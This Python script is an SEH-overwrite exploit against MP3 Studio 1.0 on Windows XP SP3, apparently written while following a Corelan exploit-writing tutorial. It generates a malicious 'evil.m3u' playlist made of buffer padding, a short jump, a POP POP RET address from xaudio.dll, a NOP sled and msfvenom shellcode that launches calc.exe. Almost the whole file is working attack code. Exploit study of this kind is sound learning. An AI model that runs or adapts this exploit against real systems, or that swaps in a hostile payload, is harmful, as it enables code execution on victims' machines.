#!python
#
# Exploit Title   : py-sploit7-xaudio-seh.py
# Exploit Author  : wetw0rk
# Version         : MP3 Studio 1.0
# Tested on       : Windows XP SP3
# Description     : An example of SEH based exploits. Created following along with
#                   part 3b of corelans tutorials!
#
# Tutorial Link :
#    https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/
#
# Original Exploit:
#     https://www.exploit-db.com/exploits/9277/
#

import os, struct

# msfvenom -a x86 --platform windows -p windows/exec
# CMD=calc.exe -f python -b "\x00\x09\x0a\x0d\x1a"
buf =  ""
buf += "\xd9\xce\xba\x7a\x7e\xda\x98\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x31\x31\x50\x18\x83\xe8\xfc\x03\x50\x6e\x9c"
buf += "\x2f\x64\x66\xe2\xd0\x95\x76\x83\x59\x70\x47\x83\x3e"
buf += "\xf0\xf7\x33\x34\x54\xfb\xb8\x18\x4d\x88\xcd\xb4\x62"
buf += "\x39\x7b\xe3\x4d\xba\xd0\xd7\xcc\x38\x2b\x04\x2f\x01"
buf += "\xe4\x59\x2e\x46\x19\x93\x62\x1f\x55\x06\x93\x14\x23"
buf += "\x9b\x18\x66\xa5\x9b\xfd\x3e\xc4\x8a\x53\x35\x9f\x0c"
buf += "\x55\x9a\xab\x04\x4d\xff\x96\xdf\xe6\xcb\x6d\xde\x2e"
buf += "\x02\x8d\x4d\x0f\xab\x7c\x8f\x57\x0b\x9f\xfa\xa1\x68"
buf += "\x22\xfd\x75\x13\xf8\x88\x6d\xb3\x8b\x2b\x4a\x42\x5f"
buf += "\xad\x19\x48\x14\xb9\x46\x4c\xab\x6e\xfd\x68\x20\x91"
buf += "\xd2\xf9\x72\xb6\xf6\xa2\x21\xd7\xaf\x0e\x87\xe8\xb0"
buf += "\xf1\x78\x4d\xba\x1f\x6c\xfc\xe1\x75\x73\x72\x9c\x3b"
buf += "\x73\x8c\x9f\x6b\x1c\xbd\x14\xe4\x5b\x42\xff\x41\x93"
buf += "\x08\xa2\xe3\x3c\xd5\x36\xb6\x20\xe6\xec\xf4\x5c\x65"
buf += "\x05\x84\x9a\x75\x6c\x81\xe7\x31\x9c\xfb\x78\xd4\xa2"
buf += "\xa8\x79\xfd\xc0\x2f\xea\x9d\x28\xca\x8a\x04\x35"

file = "evil.m3u"

junk = "http://"			# Strangley needed
junk += "A"*4103			# Offset before overwriting SEH
nSEH = "\xeb\x1e\x90\x90"		# Short JMP 30 bytes
SEH = struct.pack('<L', 0x100103AE)	# POP POP RET (xaudio.dll)
nops = "\x90"*24			# NOP Sled

buffer = junk + nSEH + SEH + nops + buf
print "[+] Overwriting SEH with 0x%08x" % (0x100103AE)
print "[+] Wrinting %d bytes to %s" % (len(buffer), file)
fd = open(file, "w")
fd.write(buffer)
fd.close

